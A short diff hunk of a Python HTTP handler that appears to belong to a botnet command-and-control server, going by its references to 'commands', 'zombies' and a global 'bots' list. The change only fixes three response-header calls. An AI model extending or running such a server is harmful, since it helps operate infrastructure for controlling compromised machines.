@@ -77,9 +77,9 @@ class Handler(BaseHTTPRequestHandler):
 				self.send_error(404,'File Not Found: %s' % self.path)
 		
 		# In case request doesn't match with 'commands' or 'zombies':
-		s.send_response(200)
-        	s.send_header("Content-type", "text/html")
-        	s.end_headers()
+		self.send_response(200)
+        	self.send_header("Content-type", "text/html")
+        	self.end_headers()
 
 	def do_POST(self):
 		global bots
